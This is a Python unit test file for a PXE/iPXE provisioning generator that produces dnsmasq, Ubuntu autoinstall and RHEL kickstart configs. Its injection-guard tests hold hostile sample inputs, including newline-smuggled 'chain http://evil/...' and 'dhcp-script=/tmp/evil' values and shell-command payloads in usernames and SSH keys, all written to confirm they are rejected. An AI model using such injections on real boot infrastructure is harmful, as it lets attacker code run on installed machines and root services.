"""PXE 生成器单元测试。

说明（本次修订）：
  - `test_per_mac_files_and_hostname` / `test_rhel_kickstart` 为原有测试。
    P1 批次**有意改变**了它们覆盖的两种行为，故这两处断言已随行为同步更新，
    并各自**加强**（见下）：按 MAC 菜单改为 iPXE 第二阶段的互斥 tag 形式；
    RHEL 装机必须提供 mirror（本机不发布 ISO 仓库树，旧的 inst.repo 会指向 404）。
  - 原 `test_ubuntu_direct_uefi` 断言的是一套**已被替换掉的手写 curtin storage 结构**
    （`"ptable": "gpt"` 等）。那套结构实测有 11 处违反 curtin 官方硬规则
    （每个条目必须有 id；volgroup 必须用 id 而非名字；format.volume / mount.device 必须指向 id），
    且 `storage` 输出为列表而 autoinstall schema 要求对象。现改为断言官方 `layout` 简写。
  - 新增 3 个回归测试，覆盖此前长期逃逸的缺陷：
      * autoinstall 键名必须是连字符 `late-commands`
      * post_script 的 YAML + POSIX shell 双层语义
      * iPXE 菜单里的分号必须转义（否则 iPXE 会把 kernel 行切成两条命令导致装机失败）
"""
import hashlib
import json
import re
import shlex
import unittest

import yaml

from app.it.pxe.generator import PxeConfig, generate_all, pick_iso


def _cfg(**kw):
    """测试辅助：本文件测的是 post_script / storage / ipxe，不是口令策略。
    U10 之后 _hash_pw 对空口令抛 ValueError，故统一补一个测试口令。
    Ubuntu 分支现在**必须**有可挂载介质（casper 的 url=），否则显式失败；
    这里给一个默认测试 ISO，需要测"无介质"的用例自行传 iso_url=""。"""
    kw.setdefault("admin_password", "Test@123")
    kw.setdefault("iso_url", "http://10.0.0.1:8000/pxe/iso/test.iso")
    return PxeConfig(**kw)


class PxeGeneratorTest(unittest.TestCase):
    # ---------------- 原有测试：保持原样 ----------------

    def test_per_mac_files_and_hostname(self):
        cfg = _cfg(
            os_type="ubuntu",
            os_version="22.04",
            hostname="base-server",
            admin_user="ops",
            admin_password="Test@123",
            server_ip="10.10.10.10",
            http_root="http://10.10.10.10:8000/pxe/serve",
            net_mode="dhcp",
            deploy_mode="standalone",
        )
        installs = [
            {"mac": "00:11:22:33:44:55", "hostname": "web-01", "ip": "10.10.10.100"},
            {"mac": "AA:BB:CC:DD:EE:FF", "hostname": "db-01", "ip": "10.10.10.101"},
        ]
        files = generate_all(cfg, installs)
        self.assertIn("boot/00-11-22-33-44-55.ipxe", files)
        self.assertIn("boot/aa-bb-cc-dd-ee-ff.ipxe", files)
        self.assertIn("user-data/00-11-22-33-44-55/user-data", files)
        self.assertIn("hostname: web-01", files["user-data/00-11-22-33-44-55/user-data"])
        self.assertIn("- reboot", files["user-data/00-11-22-33-44-55/user-data"])
        self.assertIn("user-data/00-11-22-33-44-55/", files["boot/00-11-22-33-44-55.ipxe"])
        dns = files["dnsmasq.conf"]
        self.assertIn("dhcp-host=00:11:22:33:44:55,set:pxe_00-11-22-33-44-55", dns)
        # 按 MAC 的菜单属于【第二阶段】（iPXE 自己再次 DHCP 时），用互斥 tag 下发；
        # 旧写法 dhcp-boot=tag:pxe_<mac>,<菜单URL> 会把这个脚本 URL 交给 PXE 固件，
        # 而固件执行不了 iPXE 脚本，所以它被移除了。
        self.assertIn(
            "tag-if=set:fw-menu-00-11-22-33-44-55,"
            "tag:fw-menu,tag:pxe_00-11-22-33-44-55",
            dns,
        )
        self.assertIn(
            "dhcp-boot=tag:fw-menu-00-11-22-33-44-55,"
            "http://10.10.10.10:8000/pxe/serve/boot/00-11-22-33-44-55.ipxe",
            dns,
        )
        # 守护断言①：第一阶段（PXE 固件）必须拿二进制，绝不能拿到脚本 URL
        self.assertIn("dhcp-boot=tag:fw-x64,ipxe.efi", dns)
        self.assertIn("dhcp-boot=tag:fw-ia32,ipxe-i386.efi", dns)
        self.assertIn("dhcp-boot=tag:fw-bios,undionly.kpxe", dns)
        self.assertNotIn("dhcp-boot=tag:pxe_", dns)
        # 守护断言②：每条 dhcp-boot 只带一个 tag
        # （dnsmasq 未规定"多条同时匹配时哪条胜出"，故设计上不依赖该优先级）
        for line in dns.splitlines():
            if line.startswith("dhcp-boot="):
                self.assertEqual(line.split(",")[0].count("tag:"), 1, line)

    def test_rhel_kickstart(self):
        # D17：RHEL 装机必须给出可用的安装源。本机从不发布 ISO 仓库树
        # （extract_from_iso 只拷 vmlinuz/initrd.img，目录里没有 repomd.xml），
        # 所以"没有 mirror 就指向 http_root/os"只会产出一个 404 的 inst.repo。
        cfg = _cfg(os_type="rhel", os_version="9.3", hostname="rhel-01", admin_password="x",
                   mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        files = generate_all(cfg)
        self.assertIn("ks.cfg", files)
        self.assertIn("url --url=", files["ks.cfg"])
        self.assertIn("reboot", files["ks.cfg"])
        # inst.repo 原样使用 mirror，且不再出现【臆造的 http_root + "/os"】形式。
        # 注意不能断言 assertNotIn("/os", ...)：mirror 自己的路径就可能以 /os 结尾。
        self.assertEqual(files["boot.ipxe"].count("inst.repo="), 1, files["boot.ipxe"])
        self.assertIn("inst.repo=http://mirror.example/rocky/9/BaseOS/x86_64/os/",
                      files["boot.ipxe"])
        self.assertNotIn(":8000/pxe/os", files["boot.ipxe"])

    def test_rhel_without_mirror_is_rejected(self):
        """D17 守护：无 mirror 的 RHEL 装机必须显式失败，而不是产出坏 inst.repo。

        生产上 8 个 profile 全是 ubuntu，故此行为变更不影响任何现存部署；
        这里把它钉住，避免以后有人把"静默产出 404 URL"加回来。
        """
        cfg = _cfg(os_type="rhel", os_version="9.3", hostname="rhel-01", admin_password="x")
        with self.assertRaises(ValueError) as ctx:
            generate_all(cfg)
        self.assertIn("mirror", str(ctx.exception))

    # ---------------- storage：改为断言官方 layout 简写 ----------------

    def test_ubuntu_storage_layout(self):
        """storage 必须是对象，且用官方 layout 简写（不再是手写的 curtin config 列表）。"""
        # direct
        doc = yaml.safe_load(generate_all(_cfg(disk_scheme="direct"))["user-data"])
        storage = doc["autoinstall"]["storage"]
        self.assertIsInstance(storage, dict, "storage 必须是 dict，不能是 list")
        self.assertEqual(storage["layout"]["name"], "direct")

        # 默认（lvm）
        doc = yaml.safe_load(generate_all(_cfg())["user-data"])
        storage = doc["autoinstall"]["storage"]
        self.assertIsInstance(storage, dict)
        self.assertEqual(storage["layout"]["name"], "lvm")
        self.assertNotIn("match", storage["layout"], "未指定磁盘时不应生成 match")

        # 非法值回退 lvm
        doc = yaml.safe_load(generate_all(_cfg(disk_scheme="unknown-xyz"))["user-data"])
        self.assertEqual(doc["autoinstall"]["storage"]["layout"]["name"], "lvm")

        # 指定磁盘 -> match.path
        doc = yaml.safe_load(
            generate_all(_cfg(disk_config={"disk": "vda"}))["user-data"]
        )
        self.assertEqual(
            doc["autoinstall"]["storage"]["layout"]["match"]["path"], "/dev/vda"
        )

    # ---------------- 回归：late-commands 键名 ----------------

    def test_autoinstall_late_commands_key_is_hyphenated(self):
        """键名必须是官方连字符写法。

        回归背景：曾用下划线 `late_commands`，官方 schema 里不存在该键，
        在 Ubuntu 22.04 上会被静默忽略，导致 post_script 与
        `systemctl enable ssh` 都不执行；24.04+ 会直接校验失败。
        """
        doc = yaml.safe_load(generate_all(_cfg())["user-data"])
        ai = doc["autoinstall"]
        self.assertIn("late-commands", ai)
        self.assertNotIn("late_commands", ai)

        cmds = ai["late-commands"]
        self.assertIsInstance(cmds, list)
        self.assertTrue(
            any("systemctl enable ssh" in c for c in cmds if isinstance(c, str)),
            "late-commands 中应含 systemctl enable ssh",
        )
        self.assertTrue(
            any(c.strip() == "reboot" for c in cmds if isinstance(c, str)),
            "late-commands 中应含 reboot",
        )

    # ---------------- 回归：post_script 双层语义 ----------------

    def _post_script_entries(self, doc):
        """取出 late-commands 里所有承载 bash -c 的条目。"""
        return [
            item
            for item in doc["autoinstall"]["late-commands"]
            if isinstance(item, str) and "bash -c " in item
        ]

    def _script_from_entry(self, entry):
        """把 'curtin ... bash -c <quoted>' 里的脚本按 POSIX 规则还原成参数列表。"""
        payload = entry.split("bash -c ", 1)[1]
        return shlex.split(payload)

    def test_post_script_round_trip(self):
        """post_script 必须同时通过 YAML 层与 POSIX shell 层。

        判据用「往返比较」而非子串匹配：正确的 POSIX 单引号引用必然在撇号处
        断开字面量（`echo "it's ok"` 引用后形如 `'echo "it"'\"'\"'s ok"'`），
        因此不可能出现连续的 `it's` 子串。
        """
        cases = [
            "echo hello",
            "echo \"it's ok\"",
            "echo 'quoted'",
            "touch /tmp/a\nmkdir -p /opt/b",
            "echo done: ok  # 注释",
            "echo C:\\temp\\x",
            "echo $HOME `whoami`",
        ]
        for script in cases:
            with self.subTest(script=script):
                cfg = _cfg(admin_password="Test@123", post_script=script)
                # YAML 层：整份 user-data 必须可解析，且该项是 str（不是 dict）
                doc = yaml.safe_load(generate_all(cfg)["user-data"])
                entries = self._post_script_entries(doc)
                self.assertEqual(len(entries), 1, f"应恰好有一个 bash -c 条目: {script!r}")
                entry = entries[0]
                self.assertIsInstance(entry, str)

                # 多行脚本：条目里必须含真实换行符，而不是字面的 \n 两个字符
                if "\n" in script:
                    self.assertIn("\n", entry, "多行脚本的条目应含真实换行")

                # shell 层：POSIX 还原后必须与原始脚本逐字相等
                self.assertEqual(self._script_from_entry(entry), [script])

    def test_post_script_empty_produces_two_commands(self):
        """未提供 post_script 时，late-commands 只有 systemctl enable ssh 与 reboot。"""
        doc = yaml.safe_load(generate_all(_cfg(post_script=""))["user-data"])
        cmds = doc["autoinstall"]["late-commands"]
        self.assertEqual(len(cmds), 2)
        self.assertIn("systemctl enable ssh", cmds[0])
        self.assertEqual(cmds[1], "reboot")
        self.assertEqual(self._post_script_entries(doc), [], "空脚本不应产生 bash -c 条目")

    # ---------------- 回归：iPXE 分号转义 ----------------

    def test_admin_user_and_ssh_key_cannot_inject(self):
        """admin_user 会落进 ks 的 %post（**以 root 执行**）与 autoinstall 的 YAML；
        ssh_keys 原先用 ' + chr(39) + ' 手工拼单引号。两者都必须无法注入。

        判据用 **POSIX 分词**而不是子串检查：
          · _safe_username 是"剔除"而非"拒绝"，所以字符串里可能还留着载荷片段，
            但一个字符都逃不出用户名；
          · shlex.quote 产出的 `; touch` 仍在**单引号内部**，不构成命令。
        子串存在 ≠ 可执行 —— 这一点我第一版判错过。
        """
        import shlex

        def toks(line):
            lx = shlex.shlex(line, posix=True, punctuation_chars=";&|<>()")
            lx.whitespace_split = True
            return list(lx)

        cfg = _cfg(os_type="rhel", os_version="9", hostname="r1",
                   admin_user="ops; touch /tmp/PWNED #",
                   mirror="http://m/rocky9/",
                   ssh_keys=["ssh-ed25519 AAAA' ; touch /tmp/PWNED_KEY ; echo ' x"])
        ks = generate_all(cfg)["ks.cfg"]
        for line in ks.splitlines():
            if "home/" not in line:
                continue
            t = toks(line)
            self.assertNotIn(";", t, line)
            self.assertNotIn("touch", t, line)
        user_line = next(l for l in ks.splitlines() if l.startswith("user "))
        self.assertRegex(user_line.split("--name=")[1].split()[0], r"^[A-Za-z0-9_-]+$")

        ucfg = _cfg(os_type="ubuntu",
                    admin_user="ops\n    groups: [sudo]\n    lock_passwd: false")
        import yaml
        ident = yaml.safe_load(generate_all(ucfg)["user-data"])["autoinstall"]["identity"]
        self.assertNotIn("groups", ident)
        self.assertNotIn("lock_passwd", ident)
        self.assertRegex(ident["username"], r"^[A-Za-z0-9_-]+$")


    def test_listen_ports_from_proc_fallback(self):
        """容器镜像没有 iproute2（`ss` 不存在），而容器是 host 网络模式，
        所以 /server/status 的 ports 必须能从 /proc/net/udp{,6} 回退解析。

        夹具是宿主机 /proc 的真实片段，覆盖三个坑：
          · IPv4 地址是 hex 且按**主机字节序**（7176800A -> 10.128.118.113）
          · IPv6 是 32 位 hex，每 4 字节一组也要按小端还原（...01000000 -> ::1）
          · dnsmasq 会开多个 socket，必须去重；无关端口（0016=22）必须忽略
        用 mock 喂内容，不落任何临时文件。
        """
        import builtins
        import io
        from unittest import mock

        from app.it.pxe.server import _listen_ports_from_proc

        udp = (
            "  sl  local_address rem_address   st\n"
            " 4736: 00000000:0043 00000000:0000 07\n"
            " 4736: 00000000:0043 00000000:0000 07\n"
            " 4738: 0100007F:0045 00000000:0000 07\n"
            " 4738: 7176800A:0045 00000000:0000 07\n"
            " 4736: 00000000:0016 00000000:0000 07\n"
        )
        udp6 = (
            "  sl  local_address                         remote_address   st\n"
            " 4738: 00000000000000000000000001000000:0045 0000:0000 07\n"
            " 4738: 01000000:0045 0000:0000 07\n"
        )

        def fake_open(path, *a, **k):
            return io.StringIO(udp6 if str(path).endswith("udp6") else udp)

        with mock.patch.object(builtins, "open", fake_open):
            got = _listen_ports_from_proc("/proc/net/udp", "/proc/net/udp6")
        self.assertEqual(got, ["0.0.0.0:67", "10.128.118.113:69", "127.0.0.1:69", "[::1]:69"])

        # 坏输入必须安全返回空，而不是抛异常
        for bad in ("", "  sl  local_address\n", "4736:\n",
                    " 4736: 00000000:ZZZZ 0 0 07\n"):
            with mock.patch.object(builtins, "open",
                                   lambda *a, **k: io.StringIO(bad)):
                self.assertEqual(_listen_ports_from_proc("/x", "/y"), [])


    def test_ipxe_menu_ubuntu_uses_cloud_config_url(self):
        """Ubuntu 的 kernel 行必须用 cloud-config-url 投递应答文件，并给出可挂载的 url=。

        这里断言的是**真机实测结论**，不是推测：
        - 旧写法 `ds=nocloud-net\\;s=<seed>`：iPXE 不认反斜杠转义，`\\;` 会以字面反斜杠
          进入内核命令行（内核串口实证：'Kernel command line: ... ds=nocloud\\;s=http://...'），
          cloud-init 的 DataSourceNoCloud.parse_cmdline_data() 要求精确子串 " ds=nocloud;"，
          于是失配 → 数据源退化成 none → 安装器进交互模式，autoinstall 永不生效。
        - 旧写法把相对位置参数 `--- <squashfs_path>` 当介质：casper 实测报
          "Unable to find a medium containing a live file system"。
        - cloud-init 自己也会解析 `url=`（parse_cmdline_url 在 ("cloud-config-url","url")
          里取第一个命中的键）。只写 url=<ISO> 时它把 2GB ISO 当配置文件流式下载进内存，
          实测 3.66GB anon RSS → cloud-init 被 OOM 杀，local/network 两个 stage 全 FAILED。
          所以 cloud-config-url 必须与 url= 同时在场。
        """
        menu = generate_all(_cfg(server_ip="10.0.0.1",
                                 http_root="http://10.0.0.1:8000/pxe/serve"))["boot.ipxe"]
        klines = [l for l in menu.splitlines() if l.startswith("kernel")]
        self.assertEqual(len(klines), 1)
        k = klines[0]

        self.assertIn("autoinstall", k)
        self.assertIn("cloud-config-url=http://10.0.0.1:8000/pxe/serve/user-data", k)
        self.assertIn("ip=dhcp", k)
        self.assertIn("url=http://10.0.0.1:8000/pxe/iso/test.iso", k)
        # 默认必须带串口：无显示器的机器装机失败时，串口是唯一能看到真实 cmdline / OOM /
        # curtin 卡在哪一步的地方（本项目就是靠它定案的）
        self.assertIn("console=tty0 console=ttyS0,115200", k)

        # 置空则完全不带 console=（保留给坚持把界面留在显示器上的场景）
        k2 = [l for l in generate_all(_cfg(kernel_console=""))["boot.ipxe"].splitlines()
              if l.startswith("kernel")][0]
        self.assertNotIn("console=", k2)

        # UEFI 必需：kernel 行上要给出 initrd 的名字（必须与 iPXE 注册的 basename 一致）。
        # 不带它时 UEFI(OVMF) 下内核 panic "Cannot open root device ram0"，
        # 而 BIOS 下它是 NO-OP。实测见 pve_verify_uefi.py。
        self.assertIn("initrd=initrd", k)

        # 不得再出现必然失配的转义分号写法，也不得再用相对位置介质参数
        self.assertNotIn("\\", k, "kernel 行不应含反斜杠转义")
        self.assertNotIn("nocloud", k, "Ubuntu 不再走 ds=nocloud 数据源探测")
        self.assertNotIn(" --- ", k, "不得再用相对位置介质参数")

        # 我们已经不需要分号了：iPXE 脚本里不应出现裸分号（它是命令分隔符）
        for line in menu.splitlines():
            self.assertNotIn(";", line, f"iPXE 行不应含分号: {line!r}")

    def test_per_mac_boot_uses_per_mac_seed(self):
        """每台机器的菜单必须指向自己的应答文件，而不是共享根目录的。"""
        cfg = _cfg(server_ip="10.10.10.10",
                   http_root="http://10.10.10.10:8000/pxe/serve")
        files = generate_all(cfg, [{"mac": "00:11:22:33:44:55", "hostname": "web-01"}])
        k = [l for l in files["boot/00-11-22-33-44-55.ipxe"].splitlines()
             if l.startswith("kernel")][0]
        self.assertIn(
            "cloud-config-url=http://10.10.10.10:8000/pxe/serve/user-data/00-11-22-33-44-55/user-data",
            k,
        )

    def test_ssh_enable_is_tolerant_and_ssh_pkg_added(self):
        """`systemctl enable ssh` 必须容错，且配了 ssh_keys 就要装 openssh-server。

        回归背景（真机实测）：22.04 live-server 最小安装里没有 ssh 单元，
        这条 late-command 返回 1，curtin 把**已经装好的系统**判成 install_fail，
        界面停在 "An error occurred"，其后的 `reboot` 也再也执行不到。
        """
        doc = yaml.safe_load(generate_all(_cfg(ssh_keys=["ssh-ed25519 AAAATEST k"]))["user-data"])
        ai = doc["autoinstall"]
        lc = ai["late-commands"]
        ssh_cmds = [c for c in lc if "systemctl enable ssh" in c]
        self.assertEqual(len(ssh_cmds), 1)
        self.assertIn("|| true", ssh_cmds[0], "ssh 启用必须容错，否则装机被误判失败")
        # reboot 必须仍在最后，且一定在 ssh 之后
        self.assertEqual(lc[-1], "reboot")
        self.assertLess(lc.index(ssh_cmds[0]), lc.index("reboot"))
        # 配了 authorized-keys 就必须把包也装上
        self.assertIn("openssh-server", ai.get("packages", []))

    def test_rhel_kernel_line_has_initrd_name(self):
        """RHEL 分支同样要带 `initrd=`，名字取自 initrd_path 的 basename（UEFI 必需、BIOS NO-OP）。"""
        cfg = _cfg(os_type="rhel", os_version="9", initrd_path="rhel/9/initrd.img",
                   mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        k = [l for l in generate_all(cfg)["boot.ipxe"].splitlines() if l.startswith("kernel")][0]
        self.assertIn("initrd=initrd.img", k)
        self.assertIn("inst.ks=", k)

    def test_readme_states_memory_requirement(self):
        """README 必须写明内存要求与原因（casper 走 HTTP 会把整份 ISO 读进内存）。

        这是被真实踩过的坑：目标机内存不够时表现为装机中途 OOM，而不是清晰的报错。
        """
        txt = generate_all(_cfg(iso_size_mb=2038))["README.txt"]
        self.assertIn("2038", txt)          # ISO 大小
        self.assertIn("3574", txt)          # 2038 + 1536 的建议内存
        self.assertIn("cloud-config-url", txt)   # 并说明为什么要同时给它

    def test_user_data_has_cloud_config_header(self):
        """`#cloud-config` 头现在是有承重作用的：cloud-config-url 投递的配置必须以此开头，
        cloud-init 才会认（cmd/main.py 会嗅探该头）；去掉它整条自动安装链路会静默失效。"""
        files = generate_all(_cfg(), [{"mac": "00:11:22:33:44:55", "hostname": "web-01"}])
        for key in ("user-data", "user-data/00-11-22-33-44-55/user-data"):
            self.assertTrue(files[key].startswith("#cloud-config"), key)
            self.assertIn("autoinstall:", files[key], key)

    def test_ubuntu_requires_mountable_media(self):
        """没有可用介质时必须显式失败（映射成 4xx 可读提示），而不是生成必然失败的菜单。"""
        with self.assertRaises(ValueError) as cm:
            generate_all(_cfg(iso_url=""))
        self.assertIn("iso_url", str(cm.exception))

    def test_pick_iso_picks_right_image(self):
        """正式环境同一目录会有多个系统镜像，必须按 os_type/os_version 挑准。"""
        names = ["ubuntu-22.04.5-live-server-amd64.iso",
                 "ubuntu-24.04.1-live-server-amd64.iso",
                 "Rocky-9.4-x86_64-minimal.iso",
                 "centos-7-x86_64-minimal.iso",
                 "README.txt", "download-complete.flag"]
        self.assertEqual(pick_iso(names, "ubuntu", "22.04"),
                         "ubuntu-22.04.5-live-server-amd64.iso")
        self.assertEqual(pick_iso(names, "ubuntu", "24.04"),
                         "ubuntu-24.04.1-live-server-amd64.iso")
        self.assertEqual(pick_iso(names, "rhel", "9"),
                         "Rocky-9.4-x86_64-minimal.iso")
        # 挑不到就返回空串，由调用方给出可读错误（不猜一个错的镜像）
        self.assertEqual(pick_iso(names, "ubuntu", "20.04"), "")
        self.assertEqual(pick_iso([], "ubuntu", "22.04"), "")


    def test_rhel_emits_stage2_and_extra_repos(self):
        """RHEL 系必须能把 stage2 与额外仓库（AppStream）传下去。

        真机串口实证：只给 `inst.repo=<BaseOS/>` 时，
          · 找不到 stage2 → dracut "Could not boot / /dev/root does not exist"；
          · 装完 326 个包后 → SecurityInstallationError: /usr/sbin/authconfig is missing
            （authconfig 在 AppStream，而 kickstart 里有 auth --enableshadow）。
        """
        cfg = _cfg(os_type="rhel", os_version="9", initrd_path="rhel/9/initrd.img",
                   mirror="http://10.0.0.1:8000/pxe/serve/repo/rocky-9.4/BaseOS/",
                   stage2="http://10.0.0.1:8000/pxe/serve/repo/rocky-9.4/",
                   extra_repos=[{"name": "AppStream",
                                 "url": "http://10.0.0.1:8000/pxe/serve/repo/rocky-9.4/AppStream/"}])
        files = generate_all(cfg)
        k = [l for l in files["boot.ipxe"].splitlines() if l.startswith("kernel")][0]
        self.assertIn("inst.stage2=http://10.0.0.1:8000/pxe/serve/repo/rocky-9.4/", k)
        self.assertIn("inst.repo=http://10.0.0.1:8000/pxe/serve/repo/rocky-9.4/BaseOS/", k)
        self.assertIn("inst.addrepo=AppStream,http://10.0.0.1:8000/pxe/serve/repo/rocky-9.4/AppStream/", k)
        ks = files["ks.cfg"]
        self.assertIn('url --url="http://10.0.0.1:8000/pxe/serve/repo/rocky-9.4/BaseOS/"', ks)
        self.assertIn('repo --name="AppStream" --baseurl="http://10.0.0.1:8000/pxe/serve/repo/rocky-9.4/AppStream/"', ks)

    def test_extra_repo_name_with_comma_is_rejected(self):
        """逗号是 inst.addrepo 的分隔符：出现在名字/URL 里就必须拒绝，否则语法被改写。"""
        with self.assertRaises(ValueError):
            generate_all(_cfg(os_type="rhel", os_version="9", mirror="http://m/BaseOS/",
                              extra_repos=[{"name": "App,Stream", "url": "http://m/AppStream/"}]))

    def test_url_tokens_are_single_line_only(self):
        """URL 里塞引号/空格也要被拒（会改变 kickstart 的语法结构）。"""
        with self.assertRaises(ValueError):
            generate_all(_cfg(os_type="rhel", os_version="9",
                              mirror='http://m/BaseOS/"x'))


class RhelMediaDetectTest(unittest.TestCase):
    """api 层的自动探测：运维只填一个 mirror，stage2 与 AppStream 由目录树推出来。"""

    def _tree(self, tmp):
        import os
        root = os.path.join(tmp, "rocky-9.4")
        for d in ("BaseOS", "AppStream"):
            os.makedirs(os.path.join(root, d, "repodata"))
            open(os.path.join(root, d, "repodata", "repomd.xml"), "w").write("x")
        os.makedirs(os.path.join(root, "images"))
        open(os.path.join(root, "images", "install.img"), "w").write("x")
        return root

    def test_detects_from_repo_dir(self):
        import tempfile
        from unittest import mock

        from app.api import pxe as api_pxe
        with tempfile.TemporaryDirectory() as tmp:
            self._tree(tmp)
            with mock.patch.object(api_pxe, "WEB_ROOT", tmp):
                repo, stage2, extra = api_pxe._detect_rhel_media(
                    "http://10.0.0.1:8000/pxe/serve/rocky-9.4/BaseOS/", "10.0.0.1")
        # mirror 本身就是一个 repo 时**原样保留**（不替运维改写他已给出的地址）
        self.assertEqual(repo, "http://10.0.0.1:8000/pxe/serve/rocky-9.4/BaseOS/")
        self.assertEqual(stage2, "http://10.0.0.1:8000/pxe/serve/rocky-9.4/")
        self.assertEqual([e["name"] for e in extra], ["AppStream"])

    def test_tree_root_also_works(self):
        """直接给树根也应可用：自动选一个含 repodata 的子目录当主仓库。"""
        import tempfile
        from unittest import mock

        from app.api import pxe as api_pxe
        with tempfile.TemporaryDirectory() as tmp:
            self._tree(tmp)
            with mock.patch.object(api_pxe, "WEB_ROOT", tmp):
                repo, stage2, extra = api_pxe._detect_rhel_media(
                    "http://10.0.0.1:8000/pxe/serve/rocky-9.4/", "10.0.0.1")
        self.assertEqual(repo, "http://10.0.0.1:8000/pxe/serve/rocky-9.4/AppStream/")
        self.assertEqual(stage2, "http://10.0.0.1:8000/pxe/serve/rocky-9.4/")
        self.assertEqual([e["name"] for e in extra], ["BaseOS"])

    def test_remote_mirror_is_left_alone(self):
        """远端官方镜像本身就是完整仓库树：不要乱加 stage2/addrepo。"""
        from app.api import pxe as api_pxe
        repo, stage2, extra = api_pxe._detect_rhel_media(
            "https://mirror.example/rocky/9/BaseOS/x86_64/os/", "10.0.0.1")
        self.assertEqual(repo, "https://mirror.example/rocky/9/BaseOS/x86_64/os/")
        self.assertEqual(stage2, "")
        self.assertEqual(extra, [])


class OsTypeFamilyTest(unittest.TestCase):
    """os_type 家族：RHEL 系（rhel/centos/rocky/alma/…）与 rhel 必须完全同构。"""

    def test_allowlist_matches_generator_family(self):
        """校验层白名单与 generator.RHEL_FAMILY 必须一致，否则两边会漂移。"""
        from app.core.schemas import _OS_TYPE_ALLOWED
        from app.it.pxe.generator import RHEL_FAMILY
        self.assertEqual(set(_OS_TYPE_ALLOWED) - {"ubuntu"}, set(RHEL_FAMILY))

    def test_rhel_family_gets_initrd_img_media(self):
        """填 rocky/centos/alma 时媒体必须与 rhel 一致（initrd.img）。

        旧实现只特判 `== "rhel"`：os_type 填 "rocky" 会走 anaconda 分支却拿到
        `rocky/9/initrd`（Ubuntu 风格），而 ISO 里是 images/pxeboot/initrd.img → 必然 404。
        """
        from app.api import pxe as api_pxe

        for t in ("rhel", "rocky", "centos", "alma", "almalinux", "redhat", "RHEL", " Rocky "):
            class _P:
                os_type = t
                os_version = "9"
            k, i, s = api_pxe._default_media(_P())
            self.assertEqual(i, t.strip().lower() + "/9/initrd.img", f"os_type={t!r}")
            self.assertEqual(s, "", f"os_type={t!r} 不应给出 squashfs")
        # Ubuntu 不受影响
        class _U:
            os_type = "ubuntu"
            os_version = "22.04"
        self.assertEqual(api_pxe._default_media(_U()),
                         ("ubuntu/22.04/vmlinuz", "ubuntu/22.04/initrd",
                          "ubuntu/22.04/installer.squashfs"))

    def test_os_type_is_normalized_and_validated(self):
        """大小写/空白归一化；未知类型必须被拒，而不是静默走错分支。"""
        from pydantic import ValidationError

        from app.core.schemas import PxeProfileIn
        self.assertEqual(PxeProfileIn(name="x", os_type=" RHEL ").os_type, "rhel")
        self.assertEqual(PxeProfileIn(name="x", os_type="Rocky").os_type, "rocky")
        with self.assertRaises(ValidationError):
            PxeProfileIn(name="x", os_type="windows")


class PxeInjectionGuardTest(unittest.TestCase):
    """iPXE / dnsmasq 配置注入防护。

    外部代码审查（MiMo v2.6 Pro）提出后，已用机械方式复现确认为真：
    改前 `iso_url="http://x/y.iso\\nchain http://evil/p.ipxe"` 会让生成的 boot.ipxe
    多出一行 `chain http://evil/p.ipxe`（裸机装机时执行攻击者脚本）；
    `http_root="http://x\\ndhcp-script=/tmp/evil"` 会往 dnsmasq.conf 注入
    `dhcp-script=...`，而该配置由**宿主 root dnsmasq** 加载。
    """

    INJ = "http://x/y.iso" + chr(10) + "chain http://evil/p.ipxe"

    def test_schema_rejects_newline_in_generate_body(self):
        """第 2 层：请求体里带换行的字段必须被 422 拒掉，而不是拼进脚本。"""
        from pydantic import ValidationError

        from app.core.schemas import PxeGenerateIn

        for field in ("iso_url", "http_root", "kernel_path", "initrd_path",
                      "squashfs_path", "kernel_console"):
            with self.assertRaises(ValidationError, msg="字段 " + field):
                PxeGenerateIn(**{field: "a" + chr(10) + "b"})

    def test_generator_rejects_control_chars(self):
        """第 3 层：绕过 HTTP 层直接调 generate_all，也必须注入不进去。"""
        cases = [
            {"iso_url": self.INJ},
            {"http_root": "http://10.0.0.1" + chr(10) + "dhcp-script=/tmp/evil"},
            {"kernel_path": "vmlinuz" + chr(10) + "chain http://evil/x"},
            {"kernel_console": "console=tty0" + chr(10) + "chain http://evil/x"},
            {"mirror": "http://m/" + chr(10) + "rootpw x"},      # 进 YAML 与 kickstart
            {"timezone": "UTC" + chr(10) + "late-commands:"},     # 进 YAML
            {"iso_url": "http://x/y.iso" + chr(13) + "chain http://evil/x"},  # CR 也要拦
            {"iso_url": "http://x/y.iso" + chr(9) + "chain http://evil/x"},   # TAB 也要拦
        ]
        for kw in cases:
            with self.assertRaises(ValueError, msg=str(kw)):
                generate_all(_cfg(**kw))

    def test_normal_values_not_broken(self):
        """正常值不能被误伤（否则等于用"安全"把功能打死）。"""
        files = generate_all(_cfg())
        self.assertIn("kernel ", files["boot.ipxe"])
        self.assertIn("user-data", files)
        self.assertIn("dhcp-boot=", files["dnsmasq.conf"])

    def test_pick_iso_version_boundary_and_precision(self):
        """版本按数字边界匹配；精度排序要真的生效。"""
        # 边界：查询 9 不能命中 19.4
        names = ["Rocky-19.4-x86_64-minimal.iso", "Rocky-9.4-x86_64-minimal.iso"]
        self.assertEqual(pick_iso(names, "rhel", "9"), "Rocky-9.4-x86_64-minimal.iso")
        # 精度：22.04 与 22.04.5 同时存在时，段数多的胜出
        # （旧实现 score 恒为查询版本的段数，两者平票，这条排序从未生效）
        two = ["ubuntu-22.04-live-server-amd64.iso",
               "ubuntu-22.04.5-live-server-amd64.iso"]
        self.assertEqual(pick_iso(two, "ubuntu", "22.04"),
                         "ubuntu-22.04.5-live-server-amd64.iso")
        # 22.04 的查询不能命中 24.04
        self.assertEqual(pick_iso(["ubuntu-24.04.1-live-server-amd64.iso"],
                                  "ubuntu", "22.04"), "")


class PxeIsoUrlTest(unittest.TestCase):
    """ISO 介质 URL 的编码与安全（外部代码审查提出，已独立复核为真）。"""

    def test_iso_url_percent_encodes_filename(self):
        """文件名含空格/非 ASCII 时必须百分号编码。

        不编码时 iPXE 的 kernel 行会在空格处**断开参数**：url= 只剩前半截，后半截变成
        多余的内核参数，casper 取不到介质 → "Unable to find a medium containing a live file system"。
        """
        from unittest import mock

        from app.api import pxe as api_pxe
        from app.it.pxe import server as pxe_server

        class _P:                       # 最小 profile 替身：_iso_url_for 只读这两个属性
            os_type = "ubuntu"
            os_version = "22.04"

        with mock.patch.object(pxe_server, "iso_names",
                               lambda: ["ubuntu 22.04 live.iso"]):
            url = api_pxe._iso_url_for(_P(), "10.0.0.1")

        self.assertEqual(url, "http://10.0.0.1:8000/pxe/iso/ubuntu%2022.04%20live.iso")
